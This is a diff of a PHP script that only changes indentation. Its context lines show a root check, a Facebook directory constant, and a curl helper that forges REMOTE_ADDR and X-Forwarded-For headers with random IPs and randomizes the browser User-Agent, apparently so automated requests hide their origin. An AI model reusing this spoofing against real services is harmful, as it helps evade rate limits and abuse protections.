@@ -106,7 +106,7 @@ echo "\n  └──────────────────────�
 echo "\n  ┌───────────────────────────────────────────────┐ ";
 echo "\n  | [ENG] > You Have to Run This Script as ROOT   | ";
 echo "\n  └───────────────────────────────────────────────┘\n";
-    exit;
+exit;
 }
 */
 
@@ -126,7 +126,7 @@ echo "\n  └──────────────────────�
 echo "\n  ┌───────────────────────────────────────────────┐ ";
 echo "\n  | [ENG] > You Have to Run This Script as ROOT   | ";
 echo "\n  └───────────────────────────────────────────────┘\n";
-    exit;
+exit;
 }
 
 /*
@@ -150,7 +150,7 @@ chdir(FACEBOOK_DIR . "/");
 
 // 192.XXX.XXX.XXX
 function GetIP() {
-    $ip_address = explode("\n", shell_exec("/sbin/ifconfig | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'"));
+ $ip_address = explode("\n", shell_exec("/sbin/ifconfig | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'"));
 
     foreach ($ip_address as $addr) {
         if (strncmp("127", $addr, 3) !== 0) {
@@ -192,9 +192,9 @@ $local_ip = gethostbyname( $localhost );
      	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
      	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
      	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
-		$rp=rand(0,255).'.'.rand(0,255).'.'.rand(0,255).'.'.rand(0,255);
+	$rp=rand(0,255).'.'.rand(0,255).'.'.rand(0,255).'.'.rand(0,255);
         curl_setopt($ch, CURLOPT_HTTPHEADER, array("REMOTE_ADDR: $rp", "HTTP_X_FORWARDED_FOR: $rp"));
-		curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/".rand(3,5).".".rand(0,3)." (Windows NT ".rand(3,5).".".rand(0,2)."; rv:2.0.1) Gecko/20100101 Firefox/".rand(3,5).".0.1");
+	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/".rand(3,5).".".rand(0,3)." (Windows NT ".rand(3,5).".".rand(0,2)."; rv:2.0.1) Gecko/20100101 Firefox/".rand(3,5).".0.1");
      	$data = curl_exec($ch);
      	curl_close($ch);
      	return $data;
